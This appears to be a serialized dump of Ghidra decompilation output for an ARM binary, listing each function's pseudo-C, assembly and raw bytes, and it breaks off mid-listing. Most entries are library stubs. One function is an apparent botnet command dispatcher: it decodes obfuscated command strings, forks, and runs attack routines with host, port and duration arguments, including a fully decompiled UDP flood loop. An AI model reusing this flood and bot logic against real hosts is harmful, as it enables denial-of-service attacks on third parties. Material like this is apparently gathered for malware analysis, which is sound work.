S'adr r12,0x8a30\nadd r12,r12,#0xa000\nldr pc,[r12,#0x904]!\n'
p102
S'00 c6 8f e2\n0a ca 8c e2\n04 f9 bc e5\n'
p103
S'.plt:00008a28\n.plt:00008a2c\n.plt:00008a30\n'
p104
tp105
sS'memset'
p106
(S'\n__stdcall memset(void * __s, int __c, size_t __n)\n'
p107
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid * memset(void *__s,int __c,size_t __n)\u000a\u000a{\u000a  void *pvVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a48. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pvVar1 = (void *)(*(code *)PTR_LAB_0001333c)();\u000a  return pvVar1;\u000a}\u000a\u000a
p108
S'adr r12,0x8a48\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8f4]!\n'
p109
S'00 c6 8f e2\n0a ca 8c e2\nf4 f8 bc e5\n'
p110
S'.plt:00008a40\n.plt:00008a44\n.plt:00008a48\n'
p111
tp112
sS'exit'
p113
(S'\n__stdcall exit(int __status)\n'
p114
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid exit(int __status)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008a90. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_00013354)();\u000a  return;\u000a}\u000a\u000a
p115
S'adr r12,0x8a90\nadd r12,r12,#0xa000\nldr pc,[r12,#0x8c4]!\n'
p116
S'00 c6 8f e2\n0a ca 8c e2\nc4 f8 bc e5\n'
p117
S'.plt:00008a88\n.plt:00008a8c\n.plt:00008a90\n'
p118
tp119
sS'FUN_0000a788'
p120
(S'\n__stdcall FUN_0000a788()\n'
p121
V\u000avoid FUN_0000a788(int iParm1,int iParm2,char cParm3)\u000a\u000a{\u000a  char **ppcVar1;\u000a  char cVar2;\u000a  undefined *__delim;\u000a  char *__s;\u000a  size_t sVar3;\u000a  int iVar4;\u000a  char *__dest;\u000a  char *pcVar5;\u000a  int iVar6;\u000a  bool bVar7;\u000a  char local_238 [512];\u000a  char *local_38 [4];\u000a  undefined4 local_28;\u000a  undefined4 local_24;\u000a  undefined4 local_20;\u000a  undefined4 local_1c;\u000a  \u000a  __delim = PTR_DAT_0000a8b4;\u000a  iVar4 = 0;\u000a  local_38[0] = (char *)0x0;\u000a  local_38[1] = 0;\u000a  local_38[2] = 0;\u000a  local_38[3] = 0;\u000a  local_28 = 0;\u000a  local_24 = 0;\u000a  local_20 = 0;\u000a  local_1c = 0;\u000a  if (0 < iParm2) {\u000a    iVar4 = 0;\u000a    do {\u000a      cVar2 = *(char *)(iVar4 + iParm1);\u000a      iVar6 = 0;\u000a      do {\u000a        bVar7 = cVar2 == __delim[iVar6];\u000a        if (bVar7) {\u000a          cParm3 = PTR_DAT_0000a8b8[iVar6];\u000a        }\u000a        iVar6 = iVar6 + 1;\u000a        if (bVar7) {\u000a          local_238[iVar4] = cParm3;\u000a        }\u000a      } while (iVar6 != 0x41);\u000a      iVar4 = iVar4 + 1;\u000a    } while (iParm2 != iVar4);\u000a  }\u000a  __delim = PTR_DAT_0000a8bc;\u000a  local_238[iVar4] = 0;\u000a  __s = strtok(local_238,__delim);\u000a  if (__s != (char *)0x0) {\u000a    pcVar5 = (char *)0x0;\u000a    iVar4 = 0;\u000a    do {\u000a      sVar3 = strlen(__s);\u000a      __dest = (char *)malloc(sVar3 + 1);\u000a      *(char **)(iVar4 + (int)local_38) = __dest;\u000a      strcpy(__dest,__s);\u000a      __s = strtok((char *)0x0,PTR_DAT_0000a8bc);\u000a      pcVar5 = pcVar5 + 1;\u000a      __dest = __s;\u000a      if (__s != (char *)0x0) {\u000a        __dest = (char *)0x1;\u000a      }\u000a      if (6 < (int)pcVar5) {\u000a        __dest = (char *)0x0;\u000a      }\u000a      iVar4 = iVar4 + 4;\u000a    } while (__dest != (char *)0x0);\u000a    if (0 < (int)pcVar5) {\u000a      FUN_0000a0bc(pcVar5,local_38);\u000a      do {\u000a        ppcVar1 = local_38 + (int)__dest;\u000a        __dest = __dest + 1;\u000a        free(*ppcVar1);\u000a      } while (__dest != pcVar5);\u000a    }\u000a  }\u000a  return;\u000a}\u000a\u000a
p122
S'stmdb sp!,{ r4 r5 r6 r7 r8 lr }\nmov r3,#0x0\nsub sp,sp,#0x220\nsubs r6,r1,#0x0\ncpy r5,r0\nstr r3,[sp,#0x200]\nstr r3,[sp,#0x204]\nstr r3,[sp,#0x208]\nstr r3,[sp,#0x20c]\nstr r3,[sp,#0x210]\nstr r3,[sp,#0x214]\nstr r3,[sp,#0x218]\nstr r3,[sp,#0x21c]\nldrgt r0,[0xa8b4]\ncpygt r1,r3\ncpygt r4,sp\nble 0x0000a804\nldrb lr,[r1,r5]\nmov r12,#0x0\nldrb r3,[r12,r0]\ncmp lr,r3\nldreq r3,[0xa8b8]\nldrbeq r2,[r12,r3]\nadd r12,r12,#0x1\nstrbeq r2,[r1,r4]\ncmp r12,#0x41\nbne 0x0000a7d4\nadd r1,r1,#0x1\ncmp r6,r1\nbne 0x0000a7cc\ncpy r3,r1\nadd r2,sp,#0x220\nadd r3,r2,r3\nmov r5,#0x0\ncpy r0,sp\nldr r1,[0xa8bc]\nstrb r5,[r3,#-0x220]\nbl 0x00008a10\nsubs r4,r0,#0x0\nbeq 0x0000a8ac\ncpy r6,r5\ncpy r7,r5\nadd r8,sp,#0x200\ncpy r0,r4\nbl 0x00008aa0\nadd r0,r0,#0x1\nbl 0x00008950\ncpy r1,r4\nstr r0,[r7,r8]\nbl 0x00008908\nmov r0,#0x0\nldr r1,[0xa8bc]\nbl 0x00008a10\nadd r6,r6,#0x1\nsubs r5,r0,#0x0\nmovne r5,#0x1\ncmp r6,#0x6\nmovgt r5,#0x0\ncmp r5,#0x0\ncpy r4,r0\nadd r7,r7,#0x4\nbne 0x0000a834\ncmp r6,#0x0\nble 0x0000a8ac\ncpy r0,r6\ncpy r1,r8\nbl 0x0000a0bc\ncpy r4,r5\nldr r0,[r8,r4,lsl #0x2]\nadd r4,r4,#0x1\nbl 0x00008ac4\ncmp r4,r6\nbne 0x0000a898\nadd sp,sp,#0x220\nldmia sp!,{ r4 r5 r6 r7 r8 pc }\n'
p123
S'f0 41 2d e9\n00 30 a0 e3\n22 de 4d e2\n00 60 51 e2\n00 50 a0 e1\n00 32 8d e5\n04 32 8d e5\n08 32 8d e5\n0c 32 8d e5\n10 32 8d e5\n14 32 8d e5\n18 32 8d e5\n1c 32 8d e5\nf0 00 9f c5\n03 10 a0 c1\n0d 40 a0 c1\n0d 00 00 da\n05 e0 d1 e7\n00 c0 a0 e3\n00 30 dc e7\n03 00 5e e1\nd4 30 9f 05\n03 20 dc 07\n01 c0 8c e2\n04 20 c1 07\n41 00 5c e3\nf7 ff ff 1a\n01 10 81 e2\n01 00 56 e1\nf2 ff ff 1a\n01 30 a0 e1\n22 2e 8d e2\n03 30 82 e0\n00 50 a0 e3\n0d 00 a0 e1\na0 10 9f e5\n20 52 43 e5\n7b f8 ff eb\n00 40 50 e2\n20 00 00 0a\n05 60 a0 e1\n05 70 a0 e1\n02 8c 8d e2\n04 00 a0 e1\n98 f8 ff eb\n01 00 80 e2\n42 f8 ff eb\n04 10 a0 e1\n08 00 87 e7\n2d f8 ff eb\n00 00 a0 e3\n60 10 9f e5\n6c f8 ff eb\n01 60 86 e2\n00 50 50 e2\n01 50 a0 13\n06 00 56 e3\n00 50 a0 c3\n00 00 55 e3\n00 40 a0 e1\n04 70 87 e2\nec ff ff 1a\n00 00 56 e3\n08 00 00 da\n06 00 a0 e1\n08 10 a0 e1\n09 fe ff eb\n05 40 a0 e1\n04 01 98 e7\n01 40 84 e2\n87 f8 ff eb\n06 00 54 e1\nfa ff ff 1a\n22 de 8d e2\nf0 81 bd e8\n'
p124
S'.text:0000a788\n.text:0000a78c\n.text:0000a790\n.text:0000a794\n.text:0000a798\n.text:0000a79c\n.text:0000a7a0\n.text:0000a7a4\n.text:0000a7a8\n.text:0000a7ac\n.text:0000a7b0\n.text:0000a7b4\n.text:0000a7b8\n.text:0000a7bc\n.text:0000a7c0\n.text:0000a7c4\n.text:0000a7c8\n.text:0000a7cc\n.text:0000a7d0\n.text:0000a7d4\n.text:0000a7d8\n.text:0000a7dc\n.text:0000a7e0\n.text:0000a7e4\n.text:0000a7e8\n.text:0000a7ec\n.text:0000a7f0\n.text:0000a7f4\n.text:0000a7f8\n.text:0000a7fc\n.text:0000a800\n.text:0000a804\n.text:0000a808\n.text:0000a80c\n.text:0000a810\n.text:0000a814\n.text:0000a818\n.text:0000a81c\n.text:0000a820\n.text:0000a824\n.text:0000a828\n.text:0000a82c\n.text:0000a830\n.text:0000a834\n.text:0000a838\n.text:0000a83c\n.text:0000a840\n.text:0000a844\n.text:0000a848\n.text:0000a84c\n.text:0000a850\n.text:0000a854\n.text:0000a858\n.text:0000a85c\n.text:0000a860\n.text:0000a864\n.text:0000a868\n.text:0000a86c\n.text:0000a870\n.text:0000a874\n.text:0000a878\n.text:0000a87c\n.text:0000a880\n.text:0000a884\n.text:0000a888\n.text:0000a88c\n.text:0000a890\n.text:0000a894\n.text:0000a898\n.text:0000a89c\n.text:0000a8a0\n.text:0000a8a4\n.text:0000a8a8\n.text:0000a8ac\n.text:0000a8b0\n'
p125
tp126
sS'abort'
p127
(S'\n__stdcall abort()\n'
p128
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid abort(void)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008994. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_00013300)();\u000a  return;\u000a}\u000a\u000a
p129
S'adr r12,0x8994\nadd r12,r12,#0xa000\nldr pc,[r12,#0x96c]!\n'
p130
S'00 c6 8f e2\n0a ca 8c e2\n6c f9 bc e5\n'
p131
S'.plt:0000898c\n.plt:00008990\n.plt:00008994\n'
p132
tp133
sS'strstr'
p134
(S'\n__stdcall strstr(char * __haystack, char * __needle)\n'
p135
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000achar * strstr(char *__haystack,char *__needle)\u000a\u000a{\u000a  char *pcVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089e8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pcVar1 = (char *)(*(code *)PTR_LAB_0001331c)();\u000a  return pcVar1;\u000a}\u000a\u000a
p136
S'adr r12,0x89e8\nadd r12,r12,#0xa000\nldr pc,[r12,#0x934]!\n'
p137
S'00 c6 8f e2\n0a ca 8c e2\n34 f9 bc e5\n'
p138
S'.plt:000089e0\n.plt:000089e4\n.plt:000089e8\n'
p139
tp140
sS'FUN_0000a0bc'
p141
(S'\n__stdcall FUN_0000a0bc()\n'
p142
V\u000avoid FUN_0000a0bc(int iParm1,char **ppcParm2)\u000a\u000a{\u000a  undefined *puVar1;\u000a  undefined *puVar2;\u000a  char cVar3;\u000a  time_t tVar4;\u000a  hostent *phVar5;\u000a  void *__buf;\u000a  uint uVar6;\u000a  time_t tVar7;\u000a  int __fd;\u000a  __pid_t _Var8;\u000a  uint uVar9;\u000a  void *__ptr;\u000a  int iVar10;\u000a  int iVar11;\u000a  uint uVar12;\u000a  uint uVar13;\u000a  void **ppvVar14;\u000a  char *__haystack;\u000a  char *__haystack_00;\u000a  int iVar15;\u000a  undefined *puVar16;\u000a  bool bVar17;\u000a  int *piVar18;\u000a  undefined8 uVar19;\u000a  int local_38;\u000a  undefined local_34;\u000a  undefined local_33;\u000a  char local_32;\u000a  char local_31;\u000a  undefined auStack48 [12];\u000a  \u000a  puVar1 = PTR_DAT_0000a74c;\u000a  __haystack = *ppcParm2;\u000a  memset(PTR_DAT_0000a74c + 4,0,0x200);\u000a  puVar2 = PTR_DAT_0000a750;\u000a  if (*(short *)(puVar1 + 0x204) == 0) {\u000a    __fd = 0;\u000a  }\u000a  else {\u000a    iVar15 = *(int *)puVar1;\u000a    __fd = 0;\u000a    puVar16 = puVar1;\u000a    do {\u000a      iVar10 = 0;\u000a      do {\u000a        cVar3 = *(char *)(iVar15 + __fd);\u000a        bVar17 = cVar3 == puVar2[iVar10];\u000a        if (bVar17) {\u000a          cVar3 = PTR_DAT_0000a754[iVar10];\u000a        }\u000a        iVar10 = iVar10 + 1;\u000a        if (bVar17) {\u000a          puVar16[4] = cVar3;\u000a        }\u000a      } while (iVar10 != 0x41);\u000a      __fd = __fd + 1;\u000a      puVar16 = puVar16 + 1;\u000a    } while (__fd < (int)(uint)*(ushort *)(puVar1 + 0x204));\u000a  }\u000a  puVar1[__fd + 4] = 0;\u000a  __haystack = strstr(__haystack,PTR_DAT_0000a758);\u000a  puVar2 = PTR_DAT_0000a784;\u000a  puVar1 = PTR_DAT_0000a75c;\u000a  if (__haystack != (char *)0x0) {\u000a    close(*(int *)PTR_DAT_0000a784);\u000a    free(*(void **)(puVar2 + 0x18));\u000a    *(undefined4 *)(puVar2 + 0x18) = 0;\u000a                    /* WARNING: Subroutine does not return */\u000a    exit(0);\u000a  }\u000a  __haystack_00 = *ppcParm2;\u000a  memset(PTR_DAT_0000a75c + 4,0,0x200);\u000a  puVar2 = PTR_DAT_0000a750;\u000a  if (*(short *)(puVar1 + 0x204) != 0) {\u000a    __fd = *(int *)puVar1;\u000a    puVar16 = puVar1;\u000a    do {\u000a      iVar15 = 0;\u000a      do {\u000a        cVar3 = __haystack[__fd];\u000a        bVar17 = cVar3 == puVar2[iVar15];\u000a        if (bVar17) {\u000a          cVar3 = PTR_DAT_0000a754[iVar15];\u000a        }\u000a        iVar15 = iVar15 + 1;\u000a        if (bVar17) {\u000a          puVar16[4] = cVar3;\u000a        }\u000a      } while (iVar15 != 0x41);\u000a      __haystack = __haystack + 1;\u000a      puVar16 = puVar16 + 1;\u000a    } while ((int)__haystack < (int)(uint)*(ushort *)(puVar1 + 0x204));\u000a  }\u000a  *(undefined *)((int)__haystack + (int)puVar1 + 4) = 0;\u000a  __haystack = strstr(__haystack_00,PTR_DAT_0000a760);\u000a  if (__haystack != (char *)0x0) {\u000a    if (iParm1 != 5) {\u000a      return;\u000a    }\u000a    _Var8 = fork();\u000a    puVar1 = PTR_DAT_0000a77c;\u000a    if (_Var8 != 0) {\u000a      uVar9 = *(uint *)PTR_DAT_0000a77c;\u000a      piVar18 = (int *)(PTR_DAT_0000a77c + 4);\u000a      __fd = uVar9 + 1;\u000a      *(int *)PTR_DAT_0000a77c = __fd;\u000a      *(uint *)(puVar1 + 4) = *piVar18 + (uint)(0xfffffffe < uVar9);\u000a      __buf = malloc(__fd * 4 + 4);\u000a      ppvVar14 = (void **)PTR_DAT_0000a780;\u000a      __fd = *(int *)puVar1;\u000a      uVar9 = *(int *)(puVar1 + 4) - (uint)(__fd == 0);\u000a      if ((__fd - 1U | uVar9) != 0) {\u000a        uVar12 = 0;\u000a        iVar10 = *(int *)PTR_DAT_0000a780;\u000a        iVar15 = 0;\u000a        do {\u000a          do {\u000a            uVar12 = uVar12 + 1;\u000a            *(undefined4 *)(iVar15 + (int)__buf) = *(undefined4 *)(iVar15 + iVar10);\u000a            iVar15 = iVar15 + 4;\u000a          } while (uVar9 != 0);\u000a        } while ((uVar9 == 0) && (uVar12 < __fd - 1U));\u000a      }\u000a      goto LAB_0000a564;\u000a    }\u000a    uVar9 = atoi(ppcParm2[2]);\u000a    __fd = atoi(ppcParm2[4]);\u000a    FUN_00009b20(ppcParm2[1],uVar9 & 0xffff,ppcParm2[3],__fd);\u000a  }\u000a  puVar2 = PTR_DAT_0000a764;\u000a  __haystack = *ppcParm2;\u000a  memset(PTR_DAT_0000a764 + 4,0,0x200);\u000a  puVar1 = PTR_DAT_0000a750;\u000a  if (*(short *)(puVar2 + 0x204) == 0) {\u000a    __fd = 0;\u000a  }\u000a  else {\u000a    iVar15 = *(int *)puVar2;\u000a    __fd = 0;\u000a    puVar16 = puVar2;\u000a    do {\u000a      iVar10 = 0;\u000a      do {\u000a        cVar3 = *(char *)(__fd + iVar15);\u000a        bVar17 = cVar3 == puVar1[iVar10];\u000a        if (bVar17) {\u000a          cVar3 = PTR_DAT_0000a754[iVar10];\u000a        }\u000a        iVar10 = iVar10 + 1;\u000a        if (bVar17) {\u000a          puVar16[4] = cVar3;\u000a        }\u000a      } while (iVar10 != 0x41);\u000a      __fd = __fd + 1;\u000a      puVar16 = puVar16 + 1;\u000a    } while (__fd < (int)(uint)*(ushort *)(puVar2 + 0x204));\u000a  }\u000a  puVar2[__fd + 4] = 0;\u000a  __haystack = strstr(__haystack,PTR_DAT_0000a768);\u000a  if (__haystack != (char *)0x0) {\u000a    if (iParm1 != 4) {\u000a      return;\u000a    }\u000a    _Var8 = fork();\u000a    puVar1 = PTR_DAT_0000a77c;\u000a    if (_Var8 != 0) {\u000a      uVar9 = *(uint *)PTR_DAT_0000a77c;\u000a      piVar18 = (int *)(PTR_DAT_0000a77c + 4);\u000a      __fd = uVar9 + 1;\u000a      *(int *)PTR_DAT_0000a77c = __fd;\u000a      *(uint *)(puVar1 + 4) = *piVar18 + (uint)(0xfffffffe < uVar9);\u000a      __buf = malloc(__fd * 4 + 4);\u000a      ppvVar14 = (void **)PTR_DAT_0000a780;\u000a      __fd = *(int *)puVar1;\u000a      uVar9 = *(int *)(puVar1 + 4) - (uint)(__fd == 0);\u000a      if ((__fd - 1U | uVar9) != 0) {\u000a        uVar12 = 0;\u000a        iVar10 = *(int *)PTR_DAT_0000a780;\u000a        iVar15 = 0;\u000a        do {\u000a          do {\u000a            uVar12 = uVar12 + 1;\u000a            *(undefined4 *)(iVar15 + (int)__buf) = *(undefined4 *)(iVar15 + iVar10);\u000a            iVar15 = iVar15 + 4;\u000a          } while (uVar9 != 0);\u000a        } while ((uVar9 == 0) && (uVar12 < __fd - 1U));\u000a      }\u000a      goto LAB_0000a564;\u000a    }\u000a    __fd = atoi(ppcParm2[2]);\u000a    iVar15 = atoi(ppcParm2[3]);\u000a    FUN_000093b0(ppcParm2[1],__fd,iVar15);\u000a  }\u000a  puVar2 = PTR_DAT_0000a76c;\u000a  __haystack = *ppcParm2;\u000a  memset(PTR_DAT_0000a76c + 4,0,0x200);\u000a  puVar1 = PTR_DAT_0000a750;\u000a  if (*(short *)(puVar2 + 0x204) == 0) {\u000a    __fd = 0;\u000a  }\u000a  else {\u000a    iVar15 = *(int *)puVar2;\u000a    __fd = 0;\u000a    puVar16 = puVar2;\u000a    do {\u000a      iVar10 = 0;\u000a      do {\u000a        cVar3 = *(char *)(__fd + iVar15);\u000a        bVar17 = cVar3 == puVar1[iVar10];\u000a        if (bVar17) {\u000a          cVar3 = PTR_DAT_0000a754[iVar10];\u000a        }\u000a        iVar10 = iVar10 + 1;\u000a        if (bVar17) {\u000a          puVar16[4] = cVar3;\u000a        }\u000a      } while (iVar10 != 0x41);\u000a      __fd = __fd + 1;\u000a      puVar16 = puVar16 + 1;\u000a    } while (__fd < (int)(uint)*(ushort *)(puVar2 + 0x204));\u000a  }\u000a  puVar2[__fd + 4] = 0;\u000a  __haystack = strstr(__haystack,PTR_DAT_0000a770);\u000a  if (__haystack != (char *)0x0) {\u000a    if (iParm1 != 4) {\u000a      return;\u000a    }\u000a    _Var8 = fork();\u000a    puVar1 = PTR_DAT_0000a77c;\u000a    if (_Var8 != 0) {\u000a      uVar9 = *(uint *)PTR_DAT_0000a77c;\u000a      piVar18 = (int *)(PTR_DAT_0000a77c + 4);\u000a      __fd = uVar9 + 1;\u000a      *(int *)PTR_DAT_0000a77c = __fd;\u000a      *(uint *)(puVar1 + 4) = *piVar18 + (uint)(0xfffffffe < uVar9);\u000a      __buf = malloc(__fd * 4 + 4);\u000a      ppvVar14 = (void **)PTR_DAT_0000a780;\u000a      __fd = *(int *)puVar1;\u000a      uVar9 = *(int *)(puVar1 + 4) - (uint)(__fd == 0);\u000a      if ((__fd - 1U | uVar9) != 0) {\u000a        uVar12 = 0;\u000a        iVar10 = *(int *)PTR_DAT_0000a780;\u000a        iVar15 = 0;\u000a        do {\u000a          do {\u000a            uVar12 = uVar12 + 1;\u000a            *(undefined4 *)(iVar15 + (int)__buf) = *(undefined4 *)(iVar15 + iVar10);\u000a            iVar15 = iVar15 + 4;\u000a          } while (uVar9 != 0);\u000a        } while ((uVar9 == 0) && (uVar12 < __fd - 1U));\u000a      }\u000a      goto LAB_0000a564;\u000a    }\u000a    __fd = atoi(ppcParm2[2]);\u000a    iVar15 = atoi(ppcParm2[3]);\u000a    FUN_00008e38(ppcParm2[1],__fd,iVar15);\u000a  }\u000a  puVar2 = PTR_DAT_0000a774;\u000a  __haystack = *ppcParm2;\u000a  memset(PTR_DAT_0000a774 + 4,0,0x200);\u000a  puVar1 = PTR_DAT_0000a750;\u000a  if (*(short *)(puVar2 + 0x204) == 0) {\u000a    __fd = 0;\u000a  }\u000a  else {\u000a    iVar15 = *(int *)puVar2;\u000a    __fd = 0;\u000a    puVar16 = puVar2;\u000a    do {\u000a      iVar10 = 0;\u000a      do {\u000a        cVar3 = *(char *)(iVar15 + __fd);\u000a        bVar17 = cVar3 == puVar1[iVar10];\u000a        if (bVar17) {\u000a          cVar3 = PTR_DAT_0000a754[iVar10];\u000a        }\u000a        iVar10 = iVar10 + 1;\u000a        if (bVar17) {\u000a          puVar16[4] = cVar3;\u000a        }\u000a      } while (iVar10 != 0x41);\u000a      __fd = __fd + 1;\u000a      puVar16 = puVar16 + 1;\u000a    } while (__fd < (int)(uint)*(ushort *)(puVar2 + 0x204));\u000a  }\u000a  puVar2[__fd + 4] = 0;\u000a  __haystack = strstr(__haystack,PTR_DAT_0000a778);\u000a  if (__haystack == (char *)0x0) {\u000a    return;\u000a  }\u000a  if (iParm1 != 4) {\u000a    return;\u000a  }\u000a  _Var8 = fork();\u000a  puVar1 = PTR_DAT_0000a77c;\u000a  if (_Var8 == 0) {\u000a    iVar15 = atoi(ppcParm2[2]);\u000a    iVar10 = atoi(ppcParm2[3]);\u000a    __haystack = ppcParm2[1];\u000a    __fd = socket(2,2,0);\u000a    tVar4 = time((time_t *)0x0);\u000a    phVar5 = gethostbyname(__haystack);\u000a    memset(&local_34,0,0x10);\u000a    bcopy(*phVar5->h_addr_list,&local_34 + 4,phVar5->h_length);\u000a    local_34 = (undefined)phVar5->h_addrtype;\u000a    local_33 = (undefined)((uint)phVar5->h_addrtype >> 8);\u000a    local_31 = (char)((uint)iVar15 >> 8);\u000a    local_32 = (char)iVar15;\u000a    __buf = malloc(0x201);\u000a    puVar1 = PTR_DAT_000093a4;\u000a    local_38 = 0;\u000a    while( true ) {\u000a      while( true ) {\u000a        puVar2 = PTR_DAT_000093a4;\u000a        uVar12 = *(uint *)PTR_DAT_000093a8;\u000a        uVar9 = *(uint *)PTR_DAT_000093ac;\u000a        iVar15 = 0;\u000a        do {\u000a          uVar9 = uVar9 + 1 & 0xfff;\u000a          uVar19 = __muldi3(*(undefined4 *)(puVar1 + uVar9 * 4),0,0x495e,0);\u000a          uVar6 = (uint)((ulonglong)uVar19 >> 0x20);\u000a          uVar13 = uVar12 + uVar6;\u000a          uVar12 = (int)uVar19 + (uint)CARRY4(uVar12,uVar6);\u000a          bVar17 = CARRY4(uVar12,uVar13);\u000a          iVar11 = uVar12 + uVar13;\u000a          if (bVar17) {\u000a            iVar11 = iVar11 + 1;\u000a          }\u000a          *(int *)(puVar2 + uVar9 * 4) = -2 - iVar11;\u000a          if (bVar17) {\u000a            uVar12 = uVar12 + 1;\u000a          }\u000a          cVar3 = __umodsi3(-2 - iVar11,0x1a);\u000a          *(char *)(iVar15 + (int)__buf) = cVar3 + 'A';\u000a          iVar15 = iVar15 + 1;\u000a        } while (iVar15 != 0x200);\u000a        *(uint *)PTR_DAT_000093a8 = uVar12;\u000a        *(uint *)PTR_DAT_000093ac = uVar9;\u000a        send(__fd,__buf,0x200,0);\u000a        connect(__fd,(sockaddr *)&local_34,0x10);\u000a        if (99 < local_38) break;\u000a        local_38 = local_38 + 1;\u000a      }\u000a      tVar7 = time((time_t *)0x0);\u000a      if (tVar4 + iVar10 <= tVar7) break;\u000a      local_38 = 1;\u000a    }\u000a    return;\u000a  }\u000a  uVar9 = *(uint *)PTR_DAT_0000a77c;\u000a  piVar18 = (int *)(PTR_DAT_0000a77c + 4);\u000a  __fd = uVar9 + 1;\u000a  *(int *)PTR_DAT_0000a77c = __fd;\u000a  *(uint *)(puVar1 + 4) = *piVar18 + (uint)(0xfffffffe < uVar9);\u000a  __buf = malloc(__fd * 4 + 4);\u000a  ppvVar14 = (void **)PTR_DAT_0000a780;\u000a  __fd = *(int *)puVar1;\u000a  uVar9 = *(int *)(puVar1 + 4) - (uint)(__fd == 0);\u000a  if ((__fd - 1U | uVar9) != 0) {\u000a    uVar12 = 0;\u000a    iVar10 = *(int *)PTR_DAT_0000a780;\u000a    iVar15 = 0;\u000a    do {\u000a      do {\u000a        uVar12 = uVar12 + 1;\u000a        *(undefined4 *)(iVar15 + (int)__buf) = *(undefined4 *)(iVar15 + iVar10);\u000a        iVar15 = iVar15 + 4;\u000a      } while (uVar9 != 0);\u000a    } while ((uVar9 == 0) && (uVar12 < __fd - 1U));\u000a  }\u000aLAB_0000a564:\u000a  __ptr = *ppvVar14;\u000a  *(__pid_t *)((int)__buf + __fd * 4 + -4) = _Var8;\u000a  free(__ptr);\u000a  *ppvVar14 = __buf;\u000a  return;\u000a}\u000a\u000a
p143
S'stmdb sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 lr }\nldr r5,[0xa74c]\ncpy r8,r1\nmov r2,#0x200\ncpy r9,r0\nmov r1,#0x0\nadd r0,r5,#0x4\nldr r6,[r8,#0x0]\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\nmoveq r0,#0x0\nbeq 0x0000a148\nldr r12,[r5,#0x0]\nldr r4,[0xa750]\ncpy lr,r5\nmov r0,#0x0\nmov r1,#0x0\nldrb r3,[r1,r4]\nldrb r2,[r12,r0]\ncmp r2,r3\nldreq r3,[0xa754]\nldrbeq r2,[r1,r3]\nadd r1,r1,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r1,#0x41\nbne 0x0000a108\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r0,r0,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r0\nadd lr,lr,#0x1\nbgt 0x0000a104\nadd r3,r0,r5\nmov r5,#0x0\ncpy r0,r6\nstrb r5,[r3,#0x4]\nldr r1,[0xa758]\nbl 0x000089e0\nsubs r6,r0,#0x0\nbne 0x0000a690\nldr r5,[0xa75c]\nmov r2,#0x200\ncpy r1,r6\nadd r0,r5,#0x4\nldr r10,[r8,#0x0]\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\ncpyeq r0,r6\nbeq 0x0000a1e8\nldr r4,[0xa750]\nldr lr,[r5,#0x0]\ncpy r0,r6\ncpy r1,r5\nmov r12,#0x0\nldrb r3,[r12,r4]\nldrb r2,[r0,lr]\ncmp r2,r3\nldreq r3,[0xa754]\nldrbeq r2,[r12,r3]\nadd r12,r12,#0x1\nstrbeq r2,[r1,#0x4]\ncmp r12,#0x41\nbne 0x0000a1a8\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r0,r0,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r0\nadd r1,r1,#0x1\nbgt 0x0000a1a4\nadd r3,r0,r5\nmov r2,#0x0\nstrb r2,[r3,#0x4]\ncpy r0,r10\nldr r1,[0xa760]\nbl 0x000089e0\ncmp r0,#0x0\nbeq 0x0000a250\ncmp r9,#0x5\nldmneia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 pc }\nbl 0x00008a1c\nsubs r11,r0,#0x0\nbne 0x0000a4e8\nldr r0,[r8,#0x8]\nbl 0x00008a94\nmov r4,r0, lsl #0x10\nldr r0,[r8,#0x10]\nbl 0x00008a94\nldr r5,[r8,#0x4]\nldr r6,[r8,#0xc]\nmov r4,r4, lsr #0x10\ncpy r3,r0\ncpy r1,r4\ncpy r0,r5\ncpy r2,r6\nbl 0x00009b20\nldr r5,[0xa764]\nmov r2,#0x200\nmov r1,#0x0\nadd r0,r5,#0x4\nldr r6,[r8,#0x0]\nbl 0x00008a40\nldrb r2,[r5,#0x204]\nldrb r3,[r5,#0x205]\norrs r3,r2,r3, lsl #0x8\nmoveq r12,#0x0\nbeq 0x0000a2d0\nldr r4,[0xa750]\nldr r0,[r5,#0x0]\ncpy lr,r5\nmov r12,#0x0\nmov r1,#0x0\nldrb r3,[r1,r4]\nldrb r2,[r12,r0]\ncmp r2,r3\nldreq r3,[0xa754]\nldrbeq r2,[r1,r3]\nadd r1,r1,#0x1\nstrbeq r2,[lr,#0x4]\ncmp r1,#0x41\nbne 0x0000a290\nldrb r3,[r5,#0x204]\nldrb r2,[r5,#0x205]\nadd r12,r12,#0x1\norr r3,r3,r2, lsl #0x8\ncmp r3,r12\nadd lr,lr,#0x1\nbgt 0x0000a28c\nadd r3,r12,r5\nmov r2,#0x0\nstrb r2,[r3,#0x4]\ncpy r0,r6\nldr r1,[0xa768]\nbl 0x000089e0\ncmp r0,#0x0\nbeq 0x0000a32c\ncmp r9,#0x4\nldmneia sp!,{ r4 r5 r6 r7 r8 r9 r10 r11 pc }\nbl 0x00008a1c\nsubs r11,r0,#0x0\nbne 0x0000a580\nldr r0,[r8,#0x8]\nbl 0x00008a94\ncpy r5,r0\nldr r0,[r8,#0xc]\nbl 0x00008a94\nldr r4,[r8,#0x4]\ncpy 